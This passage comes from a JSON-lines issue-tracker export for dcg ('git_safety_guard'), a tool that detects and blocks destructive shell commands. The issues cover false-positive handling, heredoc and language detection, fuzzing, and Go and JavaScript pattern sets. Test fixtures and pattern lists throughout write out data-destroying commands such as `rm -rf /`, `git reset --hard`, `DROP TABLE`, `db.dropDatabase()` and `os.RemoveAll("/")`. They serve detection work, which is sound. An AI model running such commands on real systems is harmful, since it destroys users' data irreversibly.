 - decision policy (severity)\n- Includes unit tests for:\n  - a positive match\n  - a negative (safe) snippet\n  - an unsupported-language path\n  - a timeout path (if testable)\n","notes":"## Review Additions (2026-01-08)\n\n### False positive control\nThis layer must support the FP-immunity strategy, not undermine it:\n\n- matchers should attach stable rule IDs + severity so policy can default-warn vs deny\n- matchers should support negative fixtures / “must-not-match” tests per rule family\n- prefer composite/high-signal rules (AST match + literal destructive payload) over broad matches (e.g., `exec($VAR)`)\n\n### Tests\n- For each supported language: at least one positive and one negative snippet.\n- Span/line mapping test: matches return accurate location for explain output.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T18:32:24.313325332-05:00","created_by":"ubuntu","updated_at":"2026-01-08T02:41:21.25882879-05:00","closed_at":"2026-01-08T02:41:21.25882879-05:00","close_reason":"Implemented ast-grep-core pattern matching layer with AstMatcher struct, find_matches(), timeout handling, and 17 unit tests. All acceptance criteria met.","dependencies":[{"issue_id":"git_safety_guard-f4f","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:32:32.909572665-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-f4f","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:32:32.929896409-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-f4f","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:18.965756128-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-fpim","title":"Implement false positive reduction for string arguments","description":"# False Positive Reduction Implementation\n\n## Problem\n\nCurrent regex patterns match dangerous strings even in safe contexts:\n- `bd create --description=\"This blocks rm -rf\"` → BLOCKED (wrong!)\n- `git commit -m \"Fix rm -rf pattern\"` → BLOCKED (wrong!)\n- `grep \"rm -rf\" patterns.txt` → BLOCKED (wrong!)\n\n## Solution\n\nParse command structure to identify execution context before applying destructive patterns.\n\n## Implementation\n\n### 1. Safe Command Registry\n\n```rust\nstatic SAFE_STRING_ARG_COMMANDS: \u0026[(\u0026str, \u0026[\u0026str])] = \u0026[\n    (\"bd\", \u0026[\"--description\", \"--title\", \"-d\", \"-t\"]),\n    (\"git\", \u0026[\"commit -m\", \"tag -m\", \"notes add -m\"]),\n    (\"grep\", \u0026[\"-e\", \"--regexp\"]),\n    (\"rg\", \u0026[\"-e\", \"--regexp\"]),\n    (\"echo\", \u0026[]),  // all args are strings\n    (\"printf\", \u0026[]),\n];\n```\n\n### 2. Execution Context Detection\n\n```rust\nenum ExecutionContext {\n    Direct,           // Command itself is executed\n    StringArgument,   // Inside quoted string argument to safe command\n    HeredocBody,      // Inside heredoc (needs Tier 2 analysis)\n    PipeTarget,       // Right side of pipe (executed)\n    CommandSubst,     // Inside $() or backticks (executed)\n}\n\nfn detect_execution_context(cmd: \u0026str, position: usize) -\u003e ExecutionContext;\n```\n\n### 3. Integration Point\n\nModify main check flow:\n\n```rust\nfn check_command(cmd: \u0026str) -\u003e CheckResult {\n    // Quick reject (existing)\n    if global_quick_reject(cmd) {\n        return CheckResult::allowed();\n    }\n\n    // NEW: Check if dangerous patterns are in safe context\n    if is_safe_string_context(cmd) {\n        return CheckResult::allowed();\n    }\n\n    // Continue with heredoc detection and pattern matching...\n}\n```\n\n## Test Cases\n\n### Must ALLOW (false positive prevention)\n- `bd create --description=\"Pattern blocks rm -rf commands\"`\n- `git commit -m \"Fix git reset --hard detection\"`\n- `grep \"rm -rf\" src/patterns.rs`\n- `echo \"example: git push --force\"`\n- `rg -e \"DROP TABLE\" --type sql`\n\n### Must BLOCK (true positives preserved)\n- `rm -rf /tmp/*`\n- `git reset --hard HEAD~5`\n- `bash -c \"rm -rf /\"`\n- `echo \"hi\" | bash -c \"rm -rf /\"`\n\n## Performance\n\n- \u003c 100 microseconds additional overhead\n- Simple string prefix matching for command detection\n- No regex needed for this layer\n\n## Dependencies\n\n- Depends on: False positive design (2cu)\n\n## Acceptance Criteria\n\n- The documented false-positive examples are allowed in hook mode and `dcg test`.\n- True-positive executions are still blocked, including destructive strings inside:\n  - `bash -c ...`\n  - `sh -c ...`\n  - `node -e ...` (where the code executes)\n  - command substitution (`$(...)` / backticks)\n- Context classification is conservative:\n  - only skips matching inside explicitly-registered safe string arguments\n  - does not treat unknown flags/commands as safe\n- Performance overhead is bounded (target \u003c 100µs additional overhead on typical allow-path commands).\n","notes":"## Objective\n\nImplement the execution-context + safe-string-arg behavior described in `git_safety_guard-t8x` so dcg stops blocking documentation/testing workflows (commit messages, bd descriptions, grep/rg patterns) while still blocking real executions.\n\n## Review Additions (2026-01-08)\n\n(Kept here so the task remains self-contained even though the description starts with Problem/Solution.)","status":"closed","priority":1,"issue_type":"task","assignee":"PurpleRobin","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-08T01:52:22.183030324-05:00","closed_at":"2026-01-08T01:52:22.183030324-05:00","close_reason":"Implemented safe-string-arg sanitizer + integrated into hook/evaluator; added unit/E2E regression coverage","dependencies":[{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T19:28:32.226122941-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:02:22.808621071-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-t8x.1","type":"blocks","created_at":"2026-01-07T20:03:42.899745326-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T20:03:47.932828938-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:03:52.966413813-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-fu8","title":"Implement docker-compose extractor","description":"## Objective\n\nImplement an extractor for docker-compose files to detect executable command contexts.\n\n## File Pattern\n\n- `docker-compose.yml`\n- `docker-compose.yaml`\n- `compose.yml`\n- `compose.yaml`\n\n## Extraction Targets\n\n### Command Blocks (executed)\n- `command:` values\n- `entrypoint:` values\n- `healthcheck.test:` commands\n\n### NOT Extracted (data only)\n- `environment:` values\n- `labels:` values\n- Volume paths\n- Comments\n\n## Example\n\n```yaml\nservices:\n  app:\n    command: /bin/sh -c \"rm -rf /data/*\"  # EXTRACT THIS\n    environment:\n      CLEANUP: \"rm -rf /\"  # DO NOT extract\n```\n\n## Acceptance Criteria\n\n- Correctly extracts command/entrypoint with line numbers\n- Handles both string and array formats\n- Ignores environment variables and labels\n- Unit tests with representative fixtures","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- Extract only from executed compose fields (e.g., `command`, `entrypoint`) and avoid scanning:\n  - environment variables\n  - comments\n  - labels/metadata\n- Include negative fixtures for dangerous strings in env/labels.","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T21:24:57.298774964-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:30:32.054101743-05:00","dependencies":[{"issue_id":"git_safety_guard-fu8","depends_on_id":"git_safety_guard-scan","type":"blocks","created_at":"2026-01-07T21:25:20.580453194-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fu8","depends_on_id":"git_safety_guard-scan.6","type":"parent-child","created_at":"2026-01-07T21:46:02.44142759-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-fuzz","title":"Implement fuzzing and property-based testing for heredoc parser","description":"# Fuzzing and Property-Based Testing\n\n## Objective\n\nEnsure heredoc detection is robust against malformed, malicious, or unexpected input through automated testing.\n\n## Fuzzing with cargo-fuzz\n\n### Setup\n\n```toml\n# Cargo.toml\n[dev-dependencies]\nlibfuzzer-sys = \"0.4\"\narbitrary = { version = \"1\", features = [\"derive\"] }\n```\n\n### Fuzz Targets\n\n```rust\n// fuzz/fuzz_targets/heredoc_extraction.rs\n#![no_main]\nuse libfuzzer_sys::fuzz_target;\n\nfuzz_target!(|data: \u0026str| {\n    // Should never panic\n    let _ = extract_heredoc(data);\n});\n\n// fuzz/fuzz_targets/language_detection.rs\nfuzz_target!(|data: \u0026str| {\n    let _ = detect_language(data);\n});\n\n// fuzz/fuzz_targets/tier1_regex.rs\nfuzz_target!(|data: \u0026str| {\n    let _ = might_contain_heredoc(data);\n});\n\n// fuzz/fuzz_targets/full_pipeline.rs\nfuzz_target!(|data: \u0026str| {\n    // Full check should never panic\n    let _ = check_command(data);\n});\n```\n\n### Running fuzzing\n\n```bash\ncargo install cargo-fuzz\ncargo +nightly fuzz run heredoc_extraction -- -max_len=100000\ncargo +nightly fuzz run full_pipeline -- -max_total_time=3600\n```\n\n## Property-Based Testing with proptest\n\n```toml\n[dev-dependencies]\nproptest = \"1.4\"\n```\n\n## Structured fuzzing\n\nUse `arbitrary` to generate structured heredoc inputs with variants (standard/indented/quoted).\n\n## CI Integration\n\nRun a bounded fuzz budget on a schedule (weekly) and allow manual trigger.\n\n## Acceptance Criteria\n\n- Fuzz targets exist for at least:\n  - tier1 trigger\n  - heredoc extraction\n  - language detection\n  - full pipeline\n- Fuzzing runs for a bounded time in CI (scheduled) and produces reproducible crash artifacts.\n- Property tests encode key invariants:\n  - no panics\n  - tier1 trigger is a superset of tier2 extraction triggers (no false negatives)\n  - determinism (same input → same decision) where applicable\n- Any discovered crash is converted into a minimal repro regression test.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:11:32.307108632-05:00","dependencies":[{"issue_id":"git_safety_guard-fuzz","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T19:46:42.405361011-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fuzz","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T19:46:43.72144523-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fuzz","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:56:09.803297133-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fuzz","depends_on_id":"git_safety_guard-7tg.2","type":"blocks","created_at":"2026-01-07T21:56:22.361783934-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-gie","title":"Fix dcg: unknown CLI args should error (no stdin hang)","description":"## Problem\n\n`src/main.rs` ignored clap parse errors. Running `dcg --unknown` (or any invalid CLI invocation) fell through to hook-mode and blocked on stdin, which looks like a hang and is confusing UX.\n\n## Fix\n\n- If CLI parsing fails, print the clap error and exit (status 2).\n- Keep custom `--help/-h` and `--version/-V` output behavior.\n- Hook mode (stdin JSON, no args) remains unchanged.\n\n## Acceptance criteria\n\n- `dcg --this-flag-does-not-exist` exits quickly with a clear error.\n- `dcg \u003csubcommand\u003e` continues to work normally.\n- Hook invocation via stdin JSON still works.","status":"closed","priority":2,"issue_type":"bug","created_at":"2026-01-08T04:20:37.767980269-05:00","created_by":"ubuntu","updated_at":"2026-01-08T04:21:49.547802511-05:00","closed_at":"2026-01-08T04:21:49.547802511-05:00","close_reason":"Fixed main CLI dispatch: unknown args now print clap error and exit 2 (no stdin hang)."}
{"id":"git_safety_guard-goph","title":"Define Go destructive patterns for heredoc scanning","description":"# Go Destructive Patterns for Heredoc Scanning\n\n## Objective\n\nDefine Go heredoc matchers that detect **high-signal destructive operations**, primarily when Go code is used as a wrapper to execute destructive shell commands or delete recursively.\n\n## Scope boundary\n\n- Focus on irreversible filesystem/process operations.\n- Do not turn this into a general Go security scanner (exclude unsafe/reflection/network heuristics).\n\n## Pattern families (v1)\n\n### 1) Process execution with destructive payload (high signal)\n\n- `exec.Command(\"rm\", \"-rf\", ...).Run()` (literal)\n- `exec.Command(\"bash\", \"-c\", \"rm -rf ...\")` (literal)\n- `exec.Command(\"git\", \"reset\", \"--hard\", ... )` (literal)\n\nAvoid low-signal matches:\n\n- `exec.Command($CMD, ...)` should not be a default deny.\n\n### 2) Recursive deletion (high signal)\n\n- `os.RemoveAll(\"/\")` / other clearly catastrophic literal targets → Error\n- `os.RemoveAll(\"./build\")` → Warning at most\n\n## False positive mitigation\n\n- Require negative fixtures for:\n  - benign command execution (`exec.Command(\"go\", \"test\")`)\n  - benign cleanup under `/tmp`\n  - code that prints dangerous strings\n\n## Acceptance Criteria\n\n- Defines an initial Go pattern set focused on `exec.Command` + destructive payloads and `os.RemoveAll`.\n- Includes at least 5 positive and 5 negative fixtures.\n- No default hard denies unless the matched operation is clearly catastrophic.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:07:18.115864663-05:00","dependencies":[{"issue_id":"git_safety_guard-goph","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T19:46:45.603432505-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-goph","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:56.680228592-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-hcfg","title":"Add heredoc scanning configuration and CLI flags","description":"# Heredoc Scanning Configuration\n\n## Objective\n\nAllow users to configure heredoc scanning behavior via CLI flags and config file.\n\n## CLI Flags\n\n```\ndcg check [OPTIONS]\n\nHeredoc Scanning:\n    --heredoc-scan          Enable heredoc scanning (default: true)\n    --no-heredoc-scan       Disable heredoc scanning\n    --heredoc-timeout \u003cMS\u003e  Timeout for heredoc analysis (default: 50)\n    --heredoc-languages \u003cL\u003e Languages to scan (default: all)\n                            Values: python,bash,javascript,typescript,ruby,perl\n```\n\n## Config File (~/.config/dcg/config.toml)\n\n```toml\n[heredoc]\nenabled = true\ntimeout_ms = 50\nlanguages = [\"python\", \"bash\", \"javascript\", \"typescript\", \"ruby\", \"perl\"]\n\n# Graceful degradation\nfallback_on_parse_error = true  # Allow if parsing fails\nfallback_on_timeout = true       # Allow if timeout exceeded\n\n# Logging\nlog_heredoc_detection = false    # Log when heredocs detected\nlog_pattern_matches = false      # Log which patterns matched\n```\n\n## Pack Integration\n\nAdd heredoc scanning as a pack that can be enabled/disabled:\n\n```rust\n// In packs/heredoc.rs\npub fn create_pack() -\u003e Pack {\n    Pack {\n        id: \"heredoc\".to_string(),\n        name: \"Heredoc Scanning\",\n        description: \"Detect destructive patterns in inline scripts and heredocs\",\n        keywords: \u0026[\"\u003c\u003c\", \"-c\", \"-e\", \"python\", \"bash\", \"node\"],\n        safe_patterns: vec![],\n        destructive_patterns: vec![],  // Patterns defined per-language\n    }\n}\n```\n\n## Environment Variables\n\n- `DCG_HEREDOC_ENABLED=true|false`\n- `DCG_HEREDOC_TIMEOUT=50`\n- `DCG_HEREDOC_LANGUAGES=python,bash,javascript`\n\n## Default Behavior\n\n- Heredoc scanning: ENABLED by default\n- Timeout: 50ms\n- Languages: All supported\n- Fallback: Allow on error (fail-open for usability)\n\n## Test Cases\n\n- Verify --no-heredoc-scan skips heredoc detection\n- Verify timeout is respected\n- Verify language filtering works\n- Verify config file is loaded correctly\n- Verify environment variables override config\n\n## Acceptance Criteria\n\n- CLI flags and config settings map to a single internal config model (no drift).\n- Hook mode behavior is safe:\n  - timeout/parse failures fail-open (allow) with optional diagnostics.\n- `dcg explain` surfaces heredoc config decisions (enabled/disabled/timeout) for debugging.\n- Unit tests cover flag parsing + config precedence (CLI \u003e env \u003e config file \u003e defaults).\n","notes":"## Review Additions (2026-01-08)\n\n### False positive / disruption controls\nHeredoc scanning is the highest-FP-risk feature. Config must explicitly support minimizing disruption:\n\n- per-language enable/disable\n- strict timeouts + size limits + fail-open in hook mode\n- easy disable switch for users/projects that hit noisy edge cases\n- allowlist integration (rule-based + content-hash) so teams can suppress known-safe patterns","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-08T10:49:57.809297596-05:00","closed_at":"2026-01-08T10:49:57.809297596-05:00","close_reason":"Implemented [heredoc] config (enabled/limits/language filter) + env overrides + dcg test flags; plumbed into evaluator/hook; added unit tests; ran fmt/check/clippy/test + e2e.","dependencies":[{"issue_id":"git_safety_guard-hcfg","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.542568801-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-hcfg","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:20.634350127-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-hcj","title":"Fix regex backtracking panic in normalize_command (discovered by fuzzing)","description":"## Summary\n\nFuzzer discovered a panic when `normalize_command` processes inputs with many consecutive `/` characters.\n\n## Reproduction\n\n```\n//////////////////_(rm\n```\n\nor bytes with mixed `/` and null characters:\n```\n[47, 47, 47, 0, 0, 47, 0, 0, 47, 0, 0, 47, 47, 0, 0, 47, 0, 91, ...]\n```\n\n## Root Cause\n\nIn `src/packs/mod.rs:490`, `normalize_command` uses:\n\n```rust\nPATH_NORMALIZER.replace(cmd, \"$1\")\n```\n\nwhich internally calls `.unwrap()` on the regex result. When the regex engine hits its backtrack limit, this panics:\n\n```\nthread 'panicked at fancy-regex-0.14.0/src/lib.rs:1073:45:\ncalled Result::unwrap() on an Err value: RuntimeError(BacktrackLimitExceeded)\n```\n\n## Fix\n\nHandle the error gracefully by returning the original command unchanged:\n\n```rust\npub fn normalize_command(cmd: \u0026str) -\u003e Cow\u003c'_, str\u003e {\n    if !cmd.starts_with('/') {\n        return Cow::Borrowed(cmd);\n    }\n    // Handle regex errors gracefully (fail-open)\n    PATH_NORMALIZER.replace(cmd, \"$1\").unwrap_or(Cow::Borrowed(cmd))\n}\n```\n\n## Artifacts\n\n- `fuzz/artifacts/fuzz_evaluate/minimized-from-6116856d9c40a74797b32a4ad3efe166a30f82a7`\n- `fuzz/artifacts/fuzz_normalize/minimized-from-c5521321fb46097edf17593ccf4ac7d3c9fed259`","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-01-08T00:54:15.525383593-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:58:43.724650343-05:00","closed_at":"2026-01-08T00:58:43.724650343-05:00","close_reason":"Fixed: use try_replacen with fail-open behavior. Regression test added."}
{"id":"git_safety_guard-jfj","title":"Design language detection heuristics","description":"# Design: Language Detection Heuristics for Embedded Payloads (Heredoc + Inline Script)\n\n## Objective\nDefine deterministic, performant heuristics to infer the language of extracted embedded payloads (heredocs / here-strings / inline `-c`/`-e` code), enabling AST-aware scanning *without* introducing false-positive flapping or expensive multi-grammar parsing by default.\n\nThis spec is self-contained and intended to directly drive `git_safety_guard-du4` (implementation).\n\n---\n\n## Inputs\nLanguage detection operates on a **payload** produced by Tier 2 extraction (`git_safety_guard-o15`):\n\n- `payload_kind`: `Heredoc | HereString | InlineArg`\n- `command_context`: original command string + optional lightweight tokenization of the first line\n- `payload_text`: extracted bytes (bounded) and optional `content_preview`\n- `redirection_context` (best-effort): any `\u003e file.ext` or `cat \u003e file.ext` patterns near the heredoc operator\n- `delimiter_token` (for heredocs): e.g., `EOF`, `PY`, `SQL`, etc.\n\n---\n\n## Output Model\n\nReturn a structured result:\n\n- `language`: enum (e.g., `Shell`, `Python`, `JavaScript`, `TypeScript`, `Ruby`, `Perl`, `SQL`, `Unknown`)\n- `confidence`: `High | Medium | Low`\n- `evidence`: ordered list of `{source, detail}` for explainability\n\nWhere:\n- **High** = safe to run a single AST grammar for Tier 3.\n- **Medium** = run AST only if under remaining time budget; otherwise fall back.\n- **Low** = do not AST-parse by default in hook mode; fail-open and record diagnostic.\n\n---\n\n## Deterministic Priority Order (Signals)\n\nWe must avoid “random” outcomes. Apply the first applicable rule in this exact order.\n\n### 1) Inline-script interpreter + flag (Highest confidence)\nApplicable to `InlineArg` payloads.\n\nIf the payload was extracted from:\n- `python -c ...` / `python3 -c ...` → `Python` (High)\n- `bash -c ...` / `sh -c ...` / `zsh -c ...` → `Shell` (High)\n- `node -e ...` / `node -p ...` / `nodejs -e ...` → `JavaScript` (High)\n- `ruby -e ...` → `Ruby` (High)\n- `perl -e ...` → `Perl` (High)\n\nRationale: the user explicitly chose an interpreter.\n\n### 2) Executing command prefix (High confidence when command is a known interpreter / REPL)\nApplicable to heredoc/here-string payloads when the command that **receives stdin** is known.\n\nWe need a best-effort “receiver” detection:\n- Prefer token 0 after optional `sudo`, `env VAR=...`, and leading assignments (`FOO=bar cmd ...`).\n- If a simple pipeline exists and we can cheaply detect a receiver (e.g., `... | python`), we may use the **rightmost known interpreter** as receiver (Medium).\n\nMapping table (initial):\n- `python`, `python3`, `python2` → `Python`\n- `bash`, `sh`, `zsh`, `ksh` → `Shell`\n- `node`, `nodejs` → `JavaScript`\n- `ruby`, `irb` → `Ruby`\n- `perl` → `Perl`\n- `psql` → `SQL` (PostgreSQL dialect)\n- `mysql` → `SQL` (MySQL dialect)\n- `sqlite3` → `SQL` (SQLite dialect)\n- `mongosh`, `mongo` → `JavaScript` (mongo shell scripting)\n- `redis-cli` → `Redis` (redis protocol commands; treat as `Unknown` for AST, but allow a targeted matcher set)\n\nConfidence:\n- If receiver is direct command prefix: High.\n- If receiver inferred via pipe: Medium.\n\n### 3) File extension / redirection context (Medium→High)\nIf we have a nearby redirection target with an extension:\n\n- `*.py` → `Python` (High)\n- `*.sh` → `Shell` (High)\n- `*.js` → `JavaScript` (High)\n- `*.ts` → `TypeScript` (High)\n- `*.rb` → `Ruby` (High)\n- `*.pl` → `Perl` (High)\n- `*.sql` → `SQL` (High)\n\nIf extension is found but extraction did not confirm that redirection applies to this payload, downgrade to Medium.\n\n### 4) Shebang in payload (Medium→High)\nIf the payload begins with a shebang in the first 2 lines:\n\n- `#!/usr/bin/env python*` or `#!/usr/bin/python*` → `Python` (High)\n- `#!/bin/bash` / `#!/bin/sh` / `#!/usr/bin/env bash` → `Shell` (High)\n- `#!/usr/bin/node` / `#!/usr/bin/env node` → `JavaScript` (High)\n- `#!/usr/bin/ruby` / `#!/usr/bin/env ruby` → `Ruby` (High)\n- `#!/usr/bin/perl` / `#!/usr/bin/env perl` → `Perl` (High)\n\nIf shebang conflicts with a strong receiver (Rule 2 High), prefer:\n- `InlineArg` interpreter (Rule 1) always wins.\n- Otherwise: if receiver is `cat`/`tee`/`printf` (non-interpreter), shebang wins.\n- If receiver is an interpreter (python/bash/node), receiver wins unless shebang is also consistent.\n\n### 5) Delimiter naming heuristics (Low→Medium)\nIf delimiter token strongly signals language:\n- `PY`, `PYTHON` → Python\n- `JS`, `NODE` → JavaScript\n- `TS` → TypeScript\n- `RB`, `RUBY` → Ruby\n- `PL`, `PERL` → Perl\n- `SQL`, `PSQL`, `POSTGRES` → SQL\n\nThis is never High confidence on its own (users often choose arbitrary delimiters).\n\n### 6) Content heuristics (bounded prefix scan) (Low→Medium)\nScan only a small prefix:\n- First `N_LINES=20` and `N_BYTES=2048` (whichever first), ignoring leading whitespace.\n\nHeuristic signals (examples):\n- Python: `^\\s*(import|from)\\s+`, `^\\s*def\\s+`, `^\\s*class\\s+`, `print\\(`\n- Shell: `^\\s*(set -e|set -eux|export\\s+)`, `\\b(apt-get|yum|brew)\\b`, `\\b(curl|wget)\\b` (careful: can occur in other languages)\n- JS/TS: `\\b(require\\(|module\\.exports|export\\s+)`, `\\bconst\\b`, `\\bfunction\\b`, `=\u003e`\n- Ruby: `^\\s*def\\s+`, `^\\s*end\\s*$`, `\\brequire\\b`\n- Perl: `^\\s*use\\s+strict;`, `^\\s*my\\s+\\$`, `\\bsub\\b`\n- SQL: `(?i)\\b(SELECT|INSERT|UPDATE|DELETE|DROP|TRUNCATE|ALTER|CREATE)\\b`\n\nPolicy:\n- If exactly one language has multiple strong hits → Medium.\n- If multiple languages match → Low.\n\n### 7) Config override (Deterministic)\nAllow explicit configuration to override detection:\n- `default_language = \"python\"` for unknown payloads\n- `command_language_map = { \"mytool\" = \"python\" }`\n- `project_overrides` keyed by repo path prefix\n\nOverride applies at the end (or earlier if configured as “force”). The override mechanism itself must be deterministic.\n\n---\n\n## Ambiguity Handling + Hook Policy\n\n### Default behavior (hook mode)\n- `High`: run Tier 3 AST scan for that language.\n- `Medium`: run Tier 3 AST scan **only if remaining time budget** is sufficient; else fail-open with diagnostic `language_confidence_medium_budget_exhausted`.\n- `Low`/`Unknown`: **fail-open** (allow) and attach diagnostic `language_unknown` / `language_ambiguous`.\n\n### Optional strict mode (opt-in)\nA future config mode may allow:\n- trying up to 2 languages (e.g., JS then TS)\n- or falling back to language-agnostic high-signal patterns only\n\nStrict mode is explicitly not default due to performance + false-positive risk.\n\n---\n\n## Diagnostic / Explain Fields\n\nReturn evidence chain to support `dcg explain`:\n- `source=inline_flag`, `detail=\"python -c\"`\n- `source=receiver`, `detail=\"psql\"`\n- `source=shebang`, `detail=\"#!/usr/bin/env bash\"`\n- `source=extension`, `detail=\"/tmp/script.py\"`\n- `source=content_hint`, `detail=\"import ...\"`\n\n---\n\n## Test Matrix (minimum)\n\n### 10 positive identifications\n1. `python -c 'print(1)'` → Python High (inline)\n2. `bash -c 'rm -rf /'` → Shell High (inline)\n3. `node -e 'process.exit(1)'` → JS High (inline)\n4. `ruby -e 'puts 1'` → Ruby High (inline)\n5. `perl -e 'print 1'` → Perl High (inline)\n6. `python \u003c\u003cEOF\\nprint(1)\\nEOF` → Python High (receiver)\n7. `psql \u003c\u003cSQL\\nDROP TABLE t;\\nSQL` → SQL High (receiver)\n8. `cat \u003e /tmp/x.py \u003c\u003cEOF\\nprint(1)\\nEOF` → Python High (extension)\n9. `cat \u003c\u003cEOF\\n#!/usr/bin/env bash\\necho hi\\nEOF` → Shell High (shebang)\n10. `mongosh \u003c\u003cEOF\\ndb.dropDatabase()\\nEOF` → JS High (receiver)\n\n### 5 ambiguous/unknown cases\nA. `cat \u003c\u003cEOF\\nrm -rf /\\nEOF` → Unknown/Low (cat is not interpreter; content ambiguous) → fail-open\nB. `cat \u003c\u003cEOF\\nDROP TABLE t;\\nEOF` → SQL Medium (content hint), but if multiple hints, Low\nC. `cat \u003e /tmp/x \u003c\u003cEOF\\nprint(1)\\nEOF` (no ext) → Medium via content\nD. Mixed content: `cat \u003c\u003cEOF\\nimport os\\nrm -rf /\\nEOF` → Low (multi-language)\nE. Pipeline inferred receiver: `cat \u003c\u003cEOF | python\\nprint(1)\\nEOF` → Python Medium (pipe inference)\n\n---\n\n## Acceptance Criteria Checklist\n- [ ] Deterministic priority order defined.\n- [ ] Confidence model + hook-mode fail-open policy defined.\n- [ ] Mapping table included.\n- [ ] Bounded content heuristic scan defined.\n- [ ] Test matrix includes ≥10 positive + ≥5 ambiguous cases.\n","status":"closed","priority":1,"issue_type":"task","assignee":"ubuntu","created_at":"2026-01-07T18:29:39.984610362-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:16:30.680947829-05:00","closed_at":"2026-01-08T00:16:30.680947829-05:00","close_reason":"Added deterministic language detection spec (priority-ordered signals, confidence levels, hook fail-open policy, mapping table, bounded content heuristics, diagnostics, and test matrix) to drive git_safety_guard-du4.","dependencies":[{"issue_id":"git_safety_guard-jfj","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:29:45.118494749-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-jfj","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:24.087639908-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-mcf","title":"Define JavaScript/Node destructive patterns for heredoc scanning","description":"## Objective\n\nDefine AST-aware matchers for JavaScript/Node heredoc bodies that detect **high-signal destructive operations** with minimal false positives.\n\n## Scope boundary\n\n- Focus on operations that are clearly destructive/irreversible.\n- Do not turn this into a generic “JS security” scanner (avoid network/exfiltration heuristics).\n\n## Pattern families (v1)\n\n### 1) Recursive filesystem deletion (high signal)\n\n- `fs.rmSync(path, { recursive: true, force: true })`\n- `fs.rmSync(path, { recursive: true })`\n- `fs.rmdirSync(path, { recursive: true })`\n\nSeverity guidance:\n\n- `Error` only for clearly catastrophic literal targets (e.g., `\"/\"` or other policy-defined high-risk literals).\n- Otherwise `Warning` by default.\n\n### 2) Process execution with destructive payload (high signal)\n\n- `child_process.execSync(\"rm -rf ...\")` (literal)\n- `spawnSync(\"rm\", [\"-rf\", ...])` (literal)\n- `exec(\"git reset --hard ...\")` (literal)\n\nImportant:\n\n- Do not flag `require('child_process')` alone.\n- Do not flag `exec($VAR)` as a deny; it’s too common. At most warn if combined with other signals.\n\n### 3) Known destructive package usage (optional / careful)\n\n- `rimraf(...)` (common in builds) should likely be `Warning` unless literal catastrophic path.\n\n## False positive mitigation\n\n- Require negative fixtures that include common non-destructive uses:\n  - `execSync(\"git status\")`\n  - `fs.rmSync(\"./dist\", { recursive: true })` (should be warning at most)\n  - code that merely prints dangerous strings\n\n## Acceptance Criteria\n\n- Defines a JS/Node pattern set that is high-signal and severity-tagged.\n- Includes at least:\n  - 5 positive fixtures (must match)\n  - 5 negative fixtures (must not match)\n- No matcher becomes a default hard deny unless it is clearly catastrophic.\n- Explicitly documents which constructs are intentionally not matched to preserve trust.\n","notes":"CrimsonFalcon: taking over to align severity (catastrophic literal path blocks; otherwise warn) + add missing JS/Ruby positive/negative fixtures; will run full gates and push.","status":"closed","priority":2,"issue_type":"task","assignee":"CrimsonFalcon","created_at":"2026-01-07T18:35:33.877595699-05:00","created_by":"ubuntu","updated_at":"2026-01-08T10:21:41.927767571-05:00","closed_at":"2026-01-08T10:21:41.927767571-05:00","close_reason":"Implemented patterns + 5+ positive/negative test fixtures. All tests 